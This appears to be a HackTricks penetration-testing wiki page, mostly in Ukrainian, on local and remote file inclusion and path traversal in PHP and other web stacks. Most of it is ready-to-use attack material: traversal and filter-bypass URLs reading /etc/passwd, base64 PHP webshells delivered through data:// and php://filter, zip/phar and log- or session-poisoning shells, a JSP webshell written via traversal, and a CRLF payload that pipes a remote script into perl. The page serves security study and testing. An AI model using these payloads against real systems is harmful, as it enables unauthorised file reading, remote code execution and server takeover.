# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Файл завантажується з віддаленого сервера (Перевага: ви можете написати код, і сервер його виконає). У php це за замовчуванням **відключено** (**allow_url_include**).\
**Local File Inclusion (LFI):** Сервер завантажує локальний файл.

Вразливість виникає, коли користувач якимось чином може контролювати файл, який буде завантажено сервером.

Уразливі **PHP functions**: require, require_once, include, include_once

Цікавий інструмент для експлуатації цієї вразливості: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Комбінуючи кілька \*nix LFI списків і додаючи більше шляхів, я створив цей:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Спробуйте також змінити `/` на `\`\
Спробуйте також додати `../../../../../`

Список, який використовує кілька технік для пошуку файлу /etc/password (щоб перевірити, чи існує вразливість), можна знайти [тут](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Об'єднання різних wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Спробуйте також змінити `/` на `\`\
Спробуйте також видалити `C:/` та додати `../../../../../`

Список, який використовує кілька технік для пошуку файлу /boot.ini (щоб перевірити, чи існує вразливість), можна знайти [тут](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Перегляньте LFI список linux.

## Основи LFI та методи обходу

Усі приклади стосуються Local File Inclusion, але також можуть бути застосовані до Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences видаляються нерекурсивно
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Обхід додавання додаткових символів у кінець наданого рядка (обхід: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Це **вирішено починаючи з PHP 5.4**

### **Кодування**

Ви можете використовувати нестандартні кодування, такі як double URL encode (та інші):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### З існуючої папки

Можливо, back-end перевіряє шлях до папки:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Дослідження каталогів файлової системи на сервері

Файлову систему сервера можна рекурсивно обстежити, щоб визначити каталоги, а не лише файли, використовуючи певні техніки. Процес включає визначення глибини директорії та перевірку наявності певних папок. Нижче наведено детальний метод, як це зробити:

1. **Determine Directory Depth:** Визначте глибину поточної директорії, успішно отримавши файл `/etc/passwd` (застосовно, якщо сервер базується на Linux). Приклад URL може бути побудований так, вказуючи глибину три:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Перевірте папки:** Додайте ім'я підозрюваної папки (наприклад, `private`) до URL, потім поверніться до `/etc/passwd`. Додатковий рівень директорії вимагає збільшення глибини на один:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Інтерпретація результатів:** Відповідь сервера вказує, чи існує папка:
- **Помилка / Відсутність виводу:** Папка `private` ймовірно не існує за вказаним шляхом.
- **Вміст `/etc/passwd`:** Наявність папки `private` підтверджується.
4. **Рекурсивне дослідження:** Виявлені папки можна додатково перевіряти на наявність підкаталогів або файлів, використовуючи ту ж техніку або традиційні Local File Inclusion (LFI) методи.

Для дослідження директорій у інших місцях файлової системи відкоригуйте payload відповідно. Наприклад, щоб перевірити, чи містить `/var/www/` папку `private` (припускаючи, що поточний каталог має глибину 3), використайте:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation — метод, який застосовується для маніпуляції шляхами до файлів у веб-додатках. Часто його використовують для доступу до обмежених файлів, обходячи заходи безпеки, які додають додаткові символи в кінець шляхів до файлів. Мета — сформувати шлях до файлу так, щоб після змін заходами безпеки він все ще вказував на потрібний файл.

У PHP різні представлення шляху до файлу можуть розглядатися як еквівалентні через характер файлової системи. Наприклад:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, і `/etc/passwd/` трактуються як один і той самий шлях.
- Коли останні 6 символів — `passwd`, додавання `/` (утворюючи `passwd/`) не змінює цільовий файл.
- Аналогічно, якщо до шляху додається `.php` (наприклад, `shellcode.php`), додавання `/.` наприкінці не змінює доступний файл.

Наведені приклади демонструють, як використовувати path truncation для доступу до `/etc/passwd` — частої цілі через її чутливий вміст (інформація про облікові записи користувачів):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
У цих сценаріях кількість необхідних `../` послідовностей може становити близько 2027, але це число може змінюватися залежно від конфігурації сервера.

- **Using Dot Segments and Additional Characters**: Послідовності (`../`) у поєднанні з додатковими крапковими сегментами та символами можуть використовуватися для навігації по файловій системі, фактично ігноруючи додані сервером рядки.
- **Determining the Required Number of Traversals**: Шляхом проб і помилок можна визначити точну кількість `../` послідовностей, необхідних для виходу до кореневого каталогу, а потім до `/etc/passwd`, гарантуючи, що будь-які додані рядки (наприклад, `.php`) будуть нейтралізовані, але бажаний шлях (`/etc/passwd`) залишиться незмінним.
- **Starting with a Fake Directory**: Зазвичай шлях починають з неіснуючого каталогу (наприклад, `a/`). Ця техніка використовується як запобіжний захід або щоб виконати вимоги логіки розбору шляхів на сервері.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

У php це вимкнено за замовчуванням, оскільки **`allow_url_include`** встановлено в **Off.** Його потрібно встановити в **On**, щоб це працювало, і в такому випадку ви можете include PHP-файл з вашого server і отримати RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Якщо з якоїсь причини **`allow_url_include`** є **On**, але PHP **фільтрує** доступ до зовнішніх веб-сторінок, [згідно з цією публікацією](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), ви можете, наприклад, використати data protocol з base64, щоб декодувати b64 PHP code і egt RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> У попередньому коді кінцевий `+.txt` був доданий, тому що атакуючий потребував рядка, який закінчується на `.txt`, тож рядок закінчується ним, і після b64 decode ця частина поверне лише сміття, а справжній PHP-код буде включено (і, отже, виконано).

Інший приклад **не використовуючи протокол `php://`** був би:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python кореневий елемент

У python у коді, як-от цьому:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Якщо користувач передає **абсолютний шлях** до **`file_name`**, **попередній шлях просто видаляється**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Це очікувана поведінка згідно з [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Якщо компонент є абсолютним шляхом, усі попередні компоненти відкидаються і об'єднання продовжується з компонента абсолютного шляху.

## Java: перелік директорій

Схоже, якщо у вас є Path Traversal у Java і ви **запитуєте директорію** замість файлу, то **повертається перелік вмісту директорії**. За інших мов це, наскільки мені відомо, не трапляється.

## Топ-25 параметрів

Ось список топ-25 параметрів, які можуть бути вразливими до local file inclusion (LFI) (з [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI з використанням PHP wrappers & protocols

### php://filter

PHP filters дозволяють виконувати базові **операції модифікації даних** перед тим, як вони будуть прочитані або записані. Існує 5 категорій фільтрів:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Видаляє теги з даних (усе між символами "<" і ">")
- Зверніть увагу, що цей фільтр зник у сучасних версіях PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Перетворює у іншу кодування (`convert.iconv.<input_enc>.<output_enc>`). Щоб отримати **список усіх підтримуваних кодувань**, виконайте в консолі: `iconv -l`

> [!WARNING]
> Зловживши фільтром конвертації `convert.iconv.*`, ви можете **згенерувати довільний текст**, що може бути корисно для запису довільного тексту або змусити функцію на кшталт include обробляти довільний текст. Для отримання додаткової інформації див. [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Стискає вміст (корисно при exfiltrating великої кількості інформації)
- `zlib.inflate`: Декомпресує дані
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Застаріло
- `mdecrypt.*` : Застаріло
- Інші фільтри
- Запустивши в PHP `var_dump(stream_get_filters());`, ви можете знайти кілька **неочікуваних фільтрів**:
- `consumed`
- `dechunk`: скасовує HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Частина "php://filter" нечутлива до регістру

### Використання php filters як oracle для читання довільних файлів

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) запропоновано техніку читання локального файлу без повернення виводу від сервера. Ця техніка базується на **boolean exfiltration of the file (char by char) using php filters** як oracle. Це тому, що php filters можна використовувати, щоб зробити текст достатньо великим, щоб php згенерував виняток.

В оригінальному пості ви знайдете детальне пояснення техніки, але тут коротке резюме:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- Це буде використано для генерації **тексту, настільки великого при правильному вгадуванні початкової літери**, що php викличе **помилку**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- Це, у поєднанні з попереднім (та іншими фільтрами залежно від вгаданої літери), дозволить нам вгадати літеру на початку тексту, спостерігаючи, коли ми зробили достатньо перетворень, щоб вона перестала бути an hexadecimal character. Тому що якщо hex, dechunk не видалить її і початкова бомба спричинить php error.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Використовуючи інші перетворення, як-от **rot13** на початку, можна leak інші символи, такі як n, o, p, q, r (і інші codecs можна використовувати для переміщення інших літер у hex діапазон).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- Остаточна проблема — побачити **how to leak more than the initial letter**. Використовуючи order memory filters, як-от **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**, можливо змінити порядок символів і помістити на першу позицію інші літери тексту.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and **видалити дані до сміттєвих даних** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

In the post a tool to perform this automatically was also leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Ви також можете використовувати **php://stdin, php://stdout та php://stderr** для доступу до **файлових дескрипторів 0, 1 і 2** відповідно (не впевнений, як це може бути корисним в атаці)

### zip:// та rar://

Завантажте файл Zip або Rar з PHPShell всередині та отримайте до нього доступ.\
Щоб мати змогу зловживати rar protocol, його **потрібно спеціально активувати**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Зверніть увагу, що цей протокол обмежений конфігураціями php **`allow_url_open`** та **`allow_url_include`**

### expect://

Expect має бути активовано. Ви можете виконати код за допомогою цього:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Вкажіть свій payload у параметрах POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Файл `.phar` може бути використаний для виконання PHP-коду, коли веб-застосунок використовує функції на кшталт `include` для завантаження файлів. Наведений нижче фрагмент PHP-коду показує створення файлу `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Щоб скомпілювати файл `.phar`, слід виконати таку команду:
```bash
php --define phar.readonly=0 create_path.php
```
Після виконання буде створено файл з іменем `test.phar`, який потенційно може бути використаний для експлуатації вразливостей Local File Inclusion (LFI).

Якщо LFI лише читає файл без виконання в ньому PHP-коду, через функції такі як `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` або `filesize()`, можна спробувати експлуатувати вразливість десереалізації. Ця вразливість пов'язана з читанням файлів через протокол `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Було можливо зловживати **any arbitrary file read from PHP that supports php filters** щоб отримати RCE. Детальний опис можна [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Дуже коротке резюме: **3 byte overflow** в PHP heap було використано, щоб **alter the chain of free chunks** певного розміру з метою мати можливість **write anything in any address**, тому додали хук для виклику **`system`**.\
Було можливо alloc чанки певних розмірів, зловживаючи додатковими php filters.

### Більше протоколів

Перевірте більше можливих[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — запис у пам'ять або в тимчасовий файл (не впевнений, як це може бути корисним в атаці file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — доступ до локальної файлової системи
- [http://](https://www.php.net/manual/en/wrappers.http.php) — доступ до HTTP(s) URL-ів
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — доступ до FTP(s) URL-ів
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — потоки стиснення
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — знаходить імена шляхів, що відповідають шаблону (не повертає нічого придатного для виводу, тому тут не дуже корисний)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — аудіопотоки (не корисно для читання довільних файлів)

## LFI via PHP's 'assert'

Ризики Local File Inclusion (LFI) у PHP особливо високі при роботі з функцією 'assert', яка може виконувати код зі строк. Це особливо проблематично, якщо введення, що містить символи directory traversal, такі як "..", перевіряється, але не належним чином санітизоване.

Наприклад, PHP-код може бути спроєктований для запобігання directory traversal наступним чином:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Хоча це має на меті зупинити traversal, воно ненавмисно створює вектор для code injection. Щоб використати це для читання вмісту файлу, зловмисник може скористатися:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Аналогічно, для виконання довільних системних команд можна використовувати:
```plaintext
' and die(system("id")) or '
```
Важливо **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ця техніка релевантна у випадках, коли ви **контролюєте** **file path** **PHP function**, яка буде **access a file**, але ви не побачите вміст файлу (наприклад простий виклик **`file()`**), і вміст не показується.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

У підсумку, техніка використовує **"UCS-4LE" encoding** щоб зробити вміст файлу настільки **big**, що **PHP function opening** файл спричинить **помилку**.

Потім, щоб leak the first char, використовується фільтр **`dechunk`** разом з іншими, такими як **base64** або **rot13**, і нарешті застосовуються фільтри **convert.iconv.UCS-4.UCS-4LE** та **convert.iconv.UTF16.UTF-16BE** щоб **place other chars at the beggining and leak them**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Методи захисту, що нейтралізують цей клас вразливостей:
- Розв'язувати у канонічний шлях і забезпечувати, що він є нащадком дозволеного базового каталогу.
- Відхиляти будь-який шлях, що містить `..`, абсолютні корені або літери дисків; віддавати перевагу згенерованим іменам файлів.
- Запускати writer під обліковим записом з мінімальними привілеями та розділяти директорії для запису від коренів, що обслуговуються.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Через лог-файл Apache/Nginx

Якщо сервер Apache або Nginx є **vulnerable to LFI** всередині функції include, ви можете спробувати отримати доступ до **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, записати в **user agent** або в **GET parameter** php shell типу **`<?php system($_GET['c']); ?>`** і include-нути цей файл

> [!WARNING]
> Зверніть увагу, що **якщо ви використовуєте подвійні лапки** для shell замість **простих лапок**, подвійні лапки будуть змінені на рядок "_**quote;**_", **PHP згенерує помилку** і **нічого іншого не буде виконано**.
>
> Також переконайтеся, що ви **правильно записали payload**, інакше PHP буде давати помилку щоразу при спробі завантажити файл журналу і у вас не буде другої можливості.

Це також можна зробити в інших логах, але **будьте обережні,** код всередині логів може бути URL encoded і це може зруйнувати Shell. Заголовок **authorisation "basic"** містить "user:password" в Base64 і він декодується всередині логів. PHPShell можна вставити всередину цього заголовка.\
Інші можливі шляхи логів:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Send a mail** to a internal account (user@localhost) containing your PHP payload like `<?php echo system($_REQUEST["cmd"]); ?>` and try to include to the mail of the user with a path like **`/var/mail/<USERNAME>`** or **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Завантажте багато shells (наприклад: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), де $PID — PID процесу (можна brute force), а $FD — дескриптор файлу (також можна brute force)

### Via /proc/self/environ

Як і з лог-файлом, відправте payload у User-Agent — він відобразиться всередині файлу /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Через upload

Якщо ви можете upload файл, просто inject shell payload в нього (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Щоб файл залишався читабельним, найкраще вбудувати його в метадані зображень/документів/pdf

### Через завантаження ZIP файлу

Завантажте ZIP файл, що містить стиснутий PHP shell, і отримайте доступ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Через PHP sessions

Перевірте, чи сайт використовує PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
У PHP ці сесії зберігаються в _/var/lib/php5/sess\\_\[PHPSESSID]\_ файлах
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Встановіть cookie на `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Використайте LFI, щоб включити файл сесії PHP.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Через ssh

Якщо ssh активний — перевірте, який user використовується (/proc/self/status & /etc/passwd) і спробуйте отримати доступ до **\<HOME>/.ssh/id_rsa**

### **Через** **vsftpd** _**логи**_

Логи FTP-сервера vsftpd знаходяться в _**/var/log/vsftpd.log**_. У випадку, якщо є Local File Inclusion (LFI) вразливість і доступ до відкритого vsftpd сервера можливий, можна розглянути такі кроки:

1. Інжектуйте PHP payload в поле username під час процесу входу.
2. Після інжекції використайте LFI, щоб витягти логи сервера з _**/var/log/vsftpd.log**_.

### Через php base64 filter (з використанням base64)

Як показано в [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter просто ігнорує Non-base64. Ви можете використати це, щоб обійти перевірку розширення файлу: якщо ви подасте base64, що закінчується на ".php", він просто ігноруватиме "." і додаватиме "php" до base64. Ось приклад payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Через php filters (файл не потрібен)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) пояснює, що ви можете використовувати **php filters to generate arbitrary content** як вивід. Це фактично означає, що ви можете **generate arbitrary php code** для include **without needing to write** його у файл.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Через segmentation fault

**Upload** файл, який буде збережений як **temporary** в `/tmp`, потім в **same request,** спричиніть **segmentation fault**, після чого **temporary file won't be deleted** і ви зможете його знайти.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Через Nginx temp file storage

Якщо ви знайшли **Local File Inclusion** і **Nginx** працює перед PHP, ви можете отримати RCE за допомогою наступної техніки:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Через PHP_SESSION_UPLOAD_PROGRESS

Якщо ви знайшли **Local File Inclusion**, навіть якщо у вас **don't have a session** і `session.auto_start` встановлено в `Off`. Якщо ви вкажете **`PHP_SESSION_UPLOAD_PROGRESS`** в **multipart POST** даних, PHP **enable the session for you**. Ви можете зловживати цим, щоб отримати RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Через temp file uploads in Windows

Якщо ви знайшли **Local File Inclusion** і сервер працює на **Windows**, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Через `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), скрипт `/usr/local/lib/phppearcmd.php` існує за замовчуванням в php docker images. Більше того, можливо передавати аргументи скрипту через URL, оскільки зазначено, що якщо URL параметр не має `=`, він має використовуватися як аргумент. Див. також [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) і [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Наведено приклад зловживання CRLF vuln для отримання RCE (from [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Через phpinfo() (file_uploads = on)

Якщо ви знайшли **Local File Inclusion** і файл, який показує **phpinfo()** з file_uploads = on, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
